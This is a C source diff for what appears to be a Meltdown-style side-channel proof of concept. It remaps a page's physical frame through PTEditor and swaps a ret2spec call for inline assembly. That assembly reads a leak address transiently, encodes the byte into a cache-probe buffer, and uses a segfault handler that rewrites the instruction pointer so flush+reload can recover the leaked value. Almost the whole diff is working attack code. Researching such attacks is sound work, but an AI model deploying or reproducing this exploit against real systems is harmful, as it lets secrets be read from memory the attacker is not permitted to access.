@@ -1,6 +1,5 @@
 #include "constants.h"
 #include "flush_and_reload.h"
-#include "ret2spec.h"
 #include <bits/types/siginfo_t.h>
 #include <signal.h>
 #include <stdlib.h>
@@ -15,9 +14,13 @@
 
 #include <assert.h>
 
-static void segfault_handler(int signum, siginfo_t *si, void *vcontext) {
-  ucontext_t *context = (ucontext_t *)vcontext;
-  context->uc_mcontext.gregs[16] = (uint64_t)(&ret2spec_end);
+extern uint64_t reload_label(void);
+
+#define REG_RIP 16
+static void segfault_handler(int sig, siginfo_t *info, void *ucontext) {
+  ucontext_t *uc = (ucontext_t *)ucontext;
+  greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
+  *rip = (uint64_t)&reload_label;
 }
 
 int main(int argc, char *argv[argc]) {
@@ -52,10 +55,6 @@ int main(int argc, char *argv[argc]) {
   ptedit_pte_set_pfn(leak, 0, pfn);
   // ptedit_pte_set_bit(leak, 0, PTEDIT_PAGE_BIT_GLOBAL);
 
-  struct sigaction sa = {0};
-  sa.sa_handler = segfault_handler;
-  sa.sa_flags = SA_SIGINFO;
-  sigaction(SIGSEGV, &sa, NULL);
   //
   // printf("Accessing invalid variable to bring it in TLB\n");
   // if (setjmp(deliberate_segfault)) {
@@ -63,6 +62,10 @@ int main(int argc, char *argv[argc]) {
   // }
   // sa.sa_handler = SIG_DFL;
   // sigaction(SIGSEGV, &sa, NULL);
+
+  struct sigaction sa = {0};
+  sa.sa_handler = (void *)segfault_handler;
+  sigaction(SIGSEGV, &sa, NULL);
 
   memset(reload_buffer, 0, VALUES_IN_BYTE * PAGE_SIZE);
 
@@ -74,7 +77,20 @@ int main(int argc, char *argv[argc]) {
 
     for (int i = 0; i < 10; ++i) {
       flush(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer);
-      ret2spec(leak_addr, reload_buffer);
+      asm volatile("xor %%rax, %%rax\n"
+                   "movb (%0), %%al\n"
+                   "shl $0xc, %%eax\n"
+                   "prefetcht0 (%1, %%rax)\n"
+                   "mfence\n"
+                   "loop:\n"
+                   "pause\n"
+                   "jmp loop\n"
+                   ".global reload_label\n"
+                   "reload_label:"
+
+                   ::"r"(leak_addr),
+                   "r"(reload_buffer)
+                   : "rax");
       reload(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer, results, threshold);
     }
 
@@ -86,7 +102,11 @@ int main(int argc, char *argv[argc]) {
     }
   }
 
-  // Restore leak PFN
+  // Restore the segfault handler back to normal
+  sa.sa_handler = SIG_DFL;
+  sigaction(SIGSEGV, &sa, NULL);
+
+  // Restore leak PFN before munmapping the buffer
   ptedit_pte_set_pfn(leak, 0, leak_original_pfn);
   assert(!munmap(leak, PAGE_SIZE));
   assert(!munmap(reload_buffer, VALUES_IN_BYTE * PAGE_SIZE));
